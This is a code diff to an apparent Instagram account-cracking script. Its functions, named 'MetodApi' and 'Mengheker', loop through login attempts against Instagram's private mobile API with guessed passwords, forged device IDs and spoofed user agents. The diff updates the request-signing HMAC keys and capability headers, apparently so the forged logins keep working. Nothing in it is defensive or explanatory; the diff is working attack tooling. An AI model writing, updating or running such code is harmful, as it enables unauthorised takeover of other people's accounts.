@@ -808,9 +808,9 @@ def MetodApi(user,pewe):
 		try:
 			ua = ua_oppo()
 			base = json.dumps({'id': str(uuid.uuid4()), 'experiments': 'ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left'})
-			kode = hmac.new("46024e8f31e295869a0e861eaed42cb1dd8454b55232d85f6c6764365079374b".encode('utf-8'), str(base).encode('utf=8'),hashlib.sha256).hexdigest()
+			kode = hmac.new("8b46309eb680f272cc770d214b7dbe5f0c5d26b6cb82b0b740257360b43618f0".encode('utf-8'), str(base).encode('utf=8'),hashlib.sha256).hexdigest()
 			data = {"signed_body": f"{kode}.{str(base)}"}
-			head = {'Host': 'i.instagram.com', 'content-length': f'{len(str(data))}', 'x-ig-connection-type': rc(['MOBILE(LTE)', 'WIFI']), 'x-ig-capabilities': '3brTvw==', 'accept-language': 'en-LY', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'user-agent': ua, 'accept-encoding': 'gzip, deflate'}
+			head = {'Host': 'i.instagram.com', 'content-length': f'{len(str(data))}', 'x-ig-connection-type': rc(['MOBILE(LTE)', 'WIFI']), 'x-ig-capabilities': '3brTv10=', 'accept-language': 'en-LY', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'user-agent': ua, 'accept-encoding': 'gzip, deflate'}
 			one = ses.post("https://i.instagram.com/api/v1/qe/sync/",headers=head,data=data).json()
 			if "ok" in one["status"]:break
 			else: continue
@@ -819,9 +819,9 @@ def MetodApi(user,pewe):
 		try:
 			csrf = ses.cookies["csrftoken"]
 			data = {"phone_id": str(uuid.uuid4()),"_csrftoken": csrf,"username": user,"guid": str(uuid.uuid4()),"device_id": "android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16],"password": pw,"login_attempt_count": str(sesion)}
-			ned = hmac.new("46024e8f31e295869a0e861eaed42cb1dd8454b55232d85f6c6764365079374b".encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()			
+			ned = hmac.new("8b46309eb680f272cc770d214b7dbe5f0c5d26b6cb82b0b740257360b43618f0".encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()			
 			date = f"signed_body={ned}.%7B%22phone_id%22%3A%22{str(uuid.uuid4())}%22%2C%22_csrftoken%22%3A%22{csrf}%22%2C%22username%22%3A%22{user}%22%2C%22guid%22%3A%22{str(uuid.uuid4())}%22%2C%22device_id%22%3A%22{str(uuid.uuid4())}%22%2C%22password%22%3A%22{pw}%22%2C%22login_attempt_count%22%3A%22{sesion}%22%7D&ig_sig_key_version=4"
-			head = {'Host': 'i.instagram.com', 'content-length': f'{len(str(date))}', 'x-ig-connection-type': rc(['MOBILE(LTE)', 'WIFI']), 'x-ig-capabilities': '3brTvw==', 'accept-language': 'en-LY', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'user-agent': ua, 'accept-encoding': 'gzip, deflate'}
+			head = {'Host': 'i.instagram.com', 'content-length': f'{len(str(date))}', 'x-ig-connection-type': rc(['MOBILE(LTE)', 'WIFI']), 'x-ig-capabilities': '3brTv10=', 'accept-language': 'en-LY', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'user-agent': ua, 'accept-encoding': 'gzip, deflate'}
 			bz = ses.post(f"https://i.instagram.com/api/v1/accounts/login/",headers=head,data=date)
 			#prints(bz.text,"\n\r")
 			sesion += 1
@@ -905,7 +905,7 @@ def Mengheker(user,pewe):
 		try:
 			ua = ua_regular()
 			base = json.dumps({'id': str(uuid.uuid4()), 'experiments': 'ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left'})
-			kode = hmac.new("e52986d4c6e40ac562fd36d5358f42f902ac994458600e9a60537def7a9f0107".encode('utf-8'), str(base).encode('utf=8'),hashlib.sha256).hexdigest()
+			kode = hmac.new("c47e37e1131fb044652977e468f13e6139bbd66e437069921457f7afb70bcdba".encode('utf-8'), str(base).encode('utf=8'),hashlib.sha256).hexdigest()
 			data = {"signed_body": f"{kode}.{str(base)}"}
 			head = {'Host': 'i.instagram.com', 'content-length': f'{len(str(data))}', 'x-ig-connection-type': 'WIFI', 'x-ig-capabilities': '3brTvwE=', 'accept-language': 'en-GB', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'user-agent': ua, 'accept-encoding': 'gzip, deflate'}
 			one = ses.post("https://i.instagram.com/api/v1/qe/sync/",headers=head,data=data).json()
@@ -916,7 +916,7 @@ def Mengheker(user,pewe):
 		try:
 			csrf = ses.cookies["csrftoken"]
 			data = {"phone_id": str(uuid.uuid4()),"_csrftoken": csrf,"username": user,"guid": str(uuid.uuid4()),"device_id": "android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16],"password": pw,"login_attempt_count": str(sesion)}
-			ned = hmac.new("e52986d4c6e40ac562fd36d5358f42f902ac994458600e9a60537def7a9f0107".encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()			
+			ned = hmac.new("c47e37e1131fb044652977e468f13e6139bbd66e437069921457f7afb70bcdba".encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()			
 			date = f"signed_body={ned}.%7B%22phone_id%22%3A%22{str(uuid.uuid4())}%22%2C%22_csrftoken%22%3A%22{csrf}%22%2C%22username%22%3A%22{user}%22%2C%22guid%22%3A%22{str(uuid.uuid4())}%22%2C%22device_id%22%3A%22{str(uuid.uuid4())}%22%2C%22password%22%3A%22{pw}%22%2C%22login_attempt_count%22%3A%22{sesion}%22%7D&ig_sig_key_version=4"
 			head = {'Host': 'i.instagram.com', 'content-length': f'{len(str(date))}', 'x-ig-connection-type': 'MOBILE(LTE)', 'x-ig-capabilities': '3brTvwE=', 'accept-language': 'en-GB', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'user-agent': ua, 'accept-encoding': 'gzip, deflate'}
 			bz = ses.post(f"https://b.i.instagram.com/api/v1/accounts/login/",headers=head,data=date)
